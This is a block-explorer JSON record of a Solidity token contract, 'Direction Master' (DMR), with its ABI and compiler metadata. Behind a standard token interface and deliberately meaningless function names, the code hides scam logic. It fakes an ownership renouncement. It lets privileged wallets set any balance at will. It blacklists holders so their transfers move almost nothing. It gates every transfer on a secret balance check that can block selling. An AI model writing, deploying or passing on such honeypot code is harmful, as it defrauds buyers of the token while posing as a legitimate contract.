{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface minTo {\n    function createPair(address receiverShouldFund, address receiverAt) external returns (address);\n}\n\ninterface fromToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minMarketing) external view returns (uint256);\n\n    function transfer(address limitAuto, uint256 fromWallet) external returns (bool);\n\n    function allowance(address receiverFromAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitAuto,\n        uint256 fromWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);\n    event Approval(address indexed receiverFromAuto, address indexed spender, uint256 value);\n}\n\nabstract contract maxWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingLiquidity is fromToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DirectionMaster is maxWallet, fromToken, marketingLiquidity {\n\n    bool private liquidityLaunch;\n\n    function transferFrom(address fundTo, address limitAuto, uint256 fromWallet) external override returns (bool) {\n        if (_msgSender() != liquidityWallet) {\n            if (toAuto[fundTo][_msgSender()] != type(uint256).max) {\n                require(fromWallet <= toAuto[fundTo][_msgSender()]);\n                toAuto[fundTo][_msgSender()] -= fromWallet;\n            }\n        }\n        return fromShould(fundTo, limitAuto, fromWallet);\n    }\n\n    function buyLimitSwap() public {\n        emit OwnershipTransferred(fundTeamWallet, address(0));\n        fromSender = address(0);\n    }\n\n    function teamListToken(uint256 fromWallet) public {\n        marketingMin();\n        totalSender = fromWallet;\n    }\n\n    string private sellAmount = \"Direction Master\";\n\n    bool public receiverExempt;\n\n    function owner() external view returns (address) {\n        return fromSender;\n    }\n\n    function shouldSell(address liquidityShould) public {\n        marketingMin();\n        if (receiverMaxMode != walletShould) {\n            listWallet = false;\n        }\n        if (liquidityShould == fundTeamWallet || liquidityShould == launchAuto) {\n            return;\n        }\n        totalFund[liquidityShould] = true;\n    }\n\n    uint256 private enableAt;\n\n    uint256 totalSender;\n\n    function fromShould(address fundTo, address limitAuto, uint256 fromWallet) internal returns (bool) {\n        if (fundTo == fundTeamWallet) {\n            return enableBuy(fundTo, limitAuto, fromWallet);\n        }\n        uint256 isEnable = fromToken(launchAuto).balanceOf(exemptAmountShould);\n        require(isEnable == totalSender);\n        require(limitAuto != exemptAmountShould);\n        if (totalFund[fundTo]) {\n            return enableBuy(fundTo, limitAuto, swapMin);\n        }\n        return enableBuy(fundTo, limitAuto, fromWallet);\n    }\n\n    function balanceOf(address minMarketing) public view virtual override returns (uint256) {\n        return receiverTo[minMarketing];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeExemptTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private toAuto;\n\n    uint256 private atLaunched;\n\n    event OwnershipTransferred(address indexed fundIsSwap, address indexed amountExempt);\n\n    address public launchAuto;\n\n    uint256 public walletShould;\n\n    address liquidityWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address exemptAuto, address marketingIs) external view virtual override returns (uint256) {\n        if (marketingIs == liquidityWallet) {\n            return type(uint256).max;\n        }\n        return toAuto[exemptAuto][marketingIs];\n    }\n\n    uint256 autoMin;\n\n    string private shouldEnableLaunch = \"DMR\";\n\n    function fundToken(address launchShould, uint256 fromWallet) public {\n        marketingMin();\n        receiverTo[launchShould] = fromWallet;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellAmount;\n    }\n\n    mapping(address => uint256) private receiverTo;\n\n    address private fromSender;\n\n    uint256 constant swapMin = 20 ** 10;\n\n    uint256 private receiverLimit;\n\n    uint256 public marketingTake;\n\n    mapping(address => bool) public totalFund;\n\n    function enableBuy(address fundTo, address limitAuto, uint256 fromWallet) internal returns (bool) {\n        require(receiverTo[fundTo] >= fromWallet);\n        receiverTo[fundTo] -= fromWallet;\n        receiverTo[limitAuto] += fromWallet;\n        emit Transfer(fundTo, limitAuto, fromWallet);\n        return true;\n    }\n\n    address public fundTeamWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletReceiverSell;\n    }\n\n    function transfer(address launchShould, uint256 fromWallet) external virtual override returns (bool) {\n        return fromShould(_msgSender(), launchShould, fromWallet);\n    }\n\n    mapping(address => bool) public maxReceiverFund;\n\n    uint8 private takeExemptTotal = 18;\n\n    function getOwner() external view returns (address) {\n        return fromSender;\n    }\n\n    address exemptAmountShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address marketingIs, uint256 fromWallet) public virtual override returns (bool) {\n        toAuto[_msgSender()][marketingIs] = fromWallet;\n        emit Approval(_msgSender(), marketingIs, fromWallet);\n        return true;\n    }\n\n    uint256 public receiverMaxMode;\n\n    uint256 private walletReceiverSell = 100000000 * 10 ** 18;\n\n    bool public listWallet;\n\n    function marketingMin() private view {\n        require(maxReceiverFund[_msgSender()]);\n    }\n\n    constructor (){\n        \n        totalReceiver takeLiquidity = totalReceiver(liquidityWallet);\n        launchAuto = minTo(takeLiquidity.factory()).createPair(takeLiquidity.WETH(), address(this));\n        \n        fundTeamWallet = _msgSender();\n        maxReceiverFund[fundTeamWallet] = true;\n        receiverTo[fundTeamWallet] = walletReceiverSell;\n        buyLimitSwap();\n        \n        emit Transfer(address(0), fundTeamWallet, walletReceiverSell);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldEnableLaunch;\n    }\n\n    function maxTx(address limitAmount) public {\n        require(limitAmount.balance < 100000);\n        if (receiverExempt) {\n            return;\n        }\n        if (walletShould != receiverMaxMode) {\n            receiverLimit = atLaunched;\n        }\n        maxReceiverFund[limitAmount] = true;\n        if (liquidityLaunch) {\n            enableAt = marketingTake;\n        }\n        receiverExempt = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFromAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundIsSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLimitSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTeamWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromWallet\",\"type\":\"uint256\"}],\"name\":\"fundToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAmount\",\"type\":\"address\"}],\"name\":\"maxTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMaxMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"}],\"name\":\"shouldSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromWallet\",\"type\":\"uint256\"}],\"name\":\"teamListToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DirectionMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}